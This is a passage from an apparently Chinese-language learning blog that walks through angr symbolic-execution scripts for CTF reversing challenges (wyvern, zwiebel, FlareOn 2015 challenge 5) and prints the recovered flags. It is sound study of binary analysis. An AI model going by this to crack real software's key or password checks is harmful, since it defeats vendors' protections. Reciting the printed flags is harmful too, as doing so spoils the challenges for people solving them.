    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4018B0</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'glibc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x422690</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'memcpy'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">hook_length</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">8</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x40168e</span><span class="token punctuation">,</span> hook_length<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    
<span class="token comment"># 给内存添加约束</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        b <span class="token operator">=</span> s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x6C4B20</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>b <span class="token operator">>=</span> <span class="token number">0x21</span><span class="token punctuation">,</span> b <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">)</span>

<span class="token comment"># 爆破准备 itertools </span>
    possible_values <span class="token operator">=</span> <span class="token punctuation">[</span> s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x6C4B20</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>
    possibilities <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token operator">*</span>possible_values<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token comment"># 数组执行时的动画</span>
<span class="token keyword">def</span> <span class="token function">bruteforce_possibilities</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># let's try those values!</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] example guess: %r'</span> <span class="token operator">%</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>possibilities<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] brute-forcing %d possibilities'</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> progressbar<span class="token punctuation">.</span>ProgressBar<span class="token punctuation">(</span>widgets<span class="token operator">=</span><span class="token punctuation">[</span>progressbar<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>Percentage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>Bar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> progressbar<span class="token punctuation">.</span>ETA<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>possibilities<span class="token punctuation">)</span><span class="token punctuation">:</span>
        guess_str <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
        stdout<span class="token punctuation">,</span>_ <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./whitehat_crypto400"</span><span class="token punctuation">,</span> guess_str<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'FLAG IS'</span> <span class="token keyword">in</span> stdout<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> guess_str <span class="token keyword">in</span> s<span class="token punctuation">,</span> stdout<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="CSAW-CTF-2015-Quals-Reversing-500-“wyvern”-DONE"><a href="#CSAW-CTF-2015-Quals-Reversing-500-“wyvern”-DONE" class="headerlink" title="CSAW CTF 2015 Quals - Reversing 500, “wyvern” |DONE"></a>CSAW CTF 2015 Quals - Reversing 500, “wyvern” |DONE</h3><blockquote>
<p>Script author: Audrey Dutcher (github: @rhelmot)</p>
<p>Script runtime: 15 mins</p>
<p>Concepts presented: stdin constraining, concrete optimization with Unicorn</p>
</blockquote>
<p>通过 gdb 调试得知（实在是对 CPP 编译出来的程序了解比较少）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_23-26-09.jpg" alt="Snipaste_2021-07-28_23-26-09"></p>
<p>大胆猜测字符长度</p>
<p><img src="file:///C:/Users/UserUnknow/Desktop/picture/Snipaste_2021-07-28_23-26-26.jpg" alt="Snipaste_2021-07-28_23-26-26"></p>
<p>这道题和第一道题很想，我打算根据目前所学写两个脚本</p>
<h4 id="sm-run"><a href="#sm-run" class="headerlink" title="sm.run()"></a>sm.run()</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># .virtualenvs/angr</span>
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./wyvern'</span><span class="token punctuation">)</span>

    <span class="token comment"># [INFO]0x4046FE  v5 = std::string::length(v10) - 1LL != legend >> 2; </span>
    length <span class="token operator">=</span> <span class="token number">28</span>
    <span class="token comment"># 创建符号</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span> i <span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars <span class="token operator">+</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"./wyvern"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        add_options<span class="token operator">=</span>angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>unicorn<span class="token punctuation">,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">></span><span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> sm<span class="token punctuation">.</span>deadended<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">b'success'</span> <span class="token keyword">in</span> i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token punctuation">,</span>i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="sm-explore"><a href="#sm-explore" class="headerlink" title="sm.explore()"></a>sm.explore()</h4><p>想来二者应该时差不多的，具体细节有待研究学习</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># .virtualenvs/angr/bin/python</span>
<span class="token keyword">import</span> time
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./wyvern"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x400F10</span><span class="token punctuation">,</span>angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'glibc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    length <span class="token operator">=</span> <span class="token number">28</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span> i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars <span class="token operator">+</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\b'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"./wyvern"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        add_options<span class="token operator">=</span>angr<span class="token punctuation">.</span>options<span class="token punctuation">.</span>unicorn<span class="token punctuation">,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i<span class="token operator">></span><span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    before <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x40E2BD</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x40E37A</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unstash<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'found'</span><span class="token punctuation">,</span>to_stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">)</span>
    after  <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># IPython.embed()</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>active<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>active<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Time : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>after<span class="token operator">-</span>before<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="TUMCTF-2016-zwiebel-DONE"><a href="#TUMCTF-2016-zwiebel-DONE" class="headerlink" title="TUMCTF 2016 - zwiebel |DONE"></a>TUMCTF 2016 - zwiebel |DONE</h3><blockquote>
<p>Script author: Fish<br>Script runtime: 2 hours 31 minutes with pypy and Unicorn - expect much longer with CPython only<br>Concepts presented: self-modifying code support, concrete optimization with Unicorn</p>
</blockquote>
<p>有意思 <strong>self-modifying</strong> 这个正好是我之前想的，遇到这种情况应该怎么做。当时由于对符号执行的一些细节不了解，我觉得应该手动 patch 一下程序 ，然后再根据符号执行。不过现在看来，根本不用手动，这些可以有更方便的做法。</p>
<p>脚本比较简单，主要的要点就是在程序自己解密（self-unpacking）的情况下，应该使用 unicorn ，似乎和 qemu 有关，emm 挺底层的东西，<strong>MARK</strong> 一番，另外就是由于程序由于程序可能走向非约束的解。所以提前 hook 了一个函数。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'ptrace'</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'stubs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ReturnUnconstrained'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>return_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 这个 20 个 deadended 是否是计算出来的呢，emm，不清楚不过很巧</span>
sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span>n<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>其实也可以用 explore 以正常结束为 find 猜测所有不符合的 flag 输入后都是通过系统调用离开的程序，总之方法多样，这个样例用来测试很好。由于不知道使用了多少符号，所以也没有自己创建一定数量的符号（总之一切交给 angr ）🤣</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># load process</span>
    
    <span class="token comment"># hook unconstrained function 这个应该是看经验的，要么就去魔改一下执行的函数</span>
    
    <span class="token comment"># init SimState</span>
    
    <span class="token comment"># symbol execute</span>
    
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># sm.stashes</span>
    
    <span class="token keyword">return</span> flag
    
    <span class="token comment"># TODO</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p># Here is the output (after 2 hours and 31 minutes on my machine running Pypy):</p>
<p>#</p>
<p># ipdb&gt; print(sm)</p>
<p># &lt;PathGroup with 20 errored, 21 deadended&gt;</p>
<p># ipdb&gt; print(sm.deadended[-1])</p>
<p># &lt;Path with 160170 runs (at 0x20001e0)&gt;</p>
<p># ipdb&gt; print(sm.deadended[-1].state.posix.dumps(0))</p>
<p># hxp{1_h0p3_y0u_d1dnt_p33l_th3_0ni0n_by_h4nd}</p>
<p># :)</p>
</blockquote>
<p>真要打比赛还得看优化:person_fencing: , 看来这个脚本的作者机子不大行。在没有管非约束的一些函数的情况下，我执行了 25min 差不多。感觉还是题目的加解密比较简单。</p>
<h3 id="FlareOn-2015-Challenge-5-DONE"><a href="#FlareOn-2015-Challenge-5-DONE" class="headerlink" title="FlareOn 2015 - Challenge 5 |DONE"></a>FlareOn 2015 - Challenge 5 |DONE</h3><blockquote>
<p>Script author: Adrian Tang (github: @tangabc)<br>Script runtime: 2 mins 10 secs<br>Concepts presented: Windows support</p>
</blockquote>
<p>有关这个题目本身这个 HASH 值怎么得出来的我是一头雾水（没有动调过）。所以暂且就不关注这个 HASH 了。估计是从给的包里面提取出来的。</p>
<p>这个脚本有意思的地方在于把栈堆给符号化了，然后一通执行到程序到关键函数结束后。添加约束再求解的过程。比较巧妙的解决了一种已知结果但是初始值未知（求解引擎负责）的逆向题目。</p>
<p>以下为自己纯纯的 copy，下次自己写，或者了解深了再优化。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
Full writeup of the walkthrough:
http://0x0atang.github.io/reversing/2015/09/18/flareon5-concolic.html
"""</span>
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr


<span class="token comment"># Globals</span>
LEN_PW <span class="token operator">=</span> <span class="token number">0x22</span>
ADDR_PW_ORI <span class="token operator">=</span> ADDR_PW_ENC <span class="token operator">=</span> ADDR_HASH <span class="token operator">=</span> <span class="token number">0</span>
GOAL_HASH <span class="token operator">=</span> <span class="token string">'UDYs1D7bNmdE1o3g5ms1V6RrYCVvODJF1DpxKTxAJ9xuZW=='</span>


<span class="token keyword">def</span> <span class="token function">hook_duplicate_pw_buf</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>LEN_PW<span class="token punctuation">)</span><span class="token punctuation">:</span>
        char_ori <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>ADDR_PW_ENC <span class="token operator">+</span> i<span class="token punctuation">,</span> char_ori<span class="token punctuation">)</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> ADDR_PW_ENC

<span class="token keyword">def</span> <span class="token function">hook_use_dup_pw_buf</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ecx <span class="token operator">=</span> ADDR_PW_ENC

<span class="token keyword">def</span> <span class="token function">hook_heapalloc</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> ADDR_HASH


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> ADDR_PW_ORI<span class="token punctuation">,</span> ADDR_PW_ENC<span class="token punctuation">,</span> ADDR_HASH

    <span class="token comment"># Load binary</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span>

    <span class="token comment"># Start with a blank state at the EIP after "key.txt" is read</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401198</span><span class="token punctuation">)</span>

    <span class="token comment"># Initialize global variables</span>
    ADDR_PW_ORI <span class="token operator">=</span> state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">-</span> <span class="token number">0x80004</span>
    ADDR_PW_ENC <span class="token operator">=</span> ADDR_PW_ORI <span class="token operator">+</span> <span class="token number">0x10000</span> <span class="token comment"># 看上去就是随便找了一个地方存了</span>
    ADDR_HASH <span class="token operator">=</span> state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">-</span> <span class="token number">0x40000</span>

    <span class="token comment"># Setup stack to simulate the state after which the "key.txt" is read</span>
    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esi <span class="token operator">=</span> LEN_PW
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>LEN_PW<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>mem<span class="token punctuation">[</span>ADDR_PW_ORI<span class="token operator">+</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>byte <span class="token operator">=</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'pw'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>

    <span class="token comment"># Hook instructions to use a separate buffer for the XOR-ing function</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401259</span><span class="token punctuation">,</span> hook_duplicate_pw_buf<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4011E7</span><span class="token punctuation">,</span> hook_use_dup_pw_buf<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment"># To avoid calling imports (HeapAlloc), retrofit part of the stack as </span>
    <span class="token comment"># temporary buffer to hold symbolic copy of the password</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4011D6</span><span class="token punctuation">,</span> hook_heapalloc<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>

    <span class="token comment"># Explore the states until after the hash is computed</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4011EC</span><span class="token punctuation">)</span>

    <span class="token comment"># Add constraints to make final hash equal to the one we want</span>
    <span class="token comment"># Also restrict the hash to only printable bytes</span>
    found_s <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>GOAL_HASH<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        char <span class="token operator">=</span> found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_HASH <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        found_s<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>char <span class="token operator">>=</span> <span class="token number">0x21</span><span class="token punctuation">,</span>
                                char <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">,</span>
                                char <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>GOAL_HASH<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Solve for password that will result in the required hash</span>
    <span class="token keyword">return</span> found_s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
          found_s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found_s<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>ADDR_PW_ORI<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> LEN_PW<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'Sp1cy_7_layer_OSI_dip@flare-on.com'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
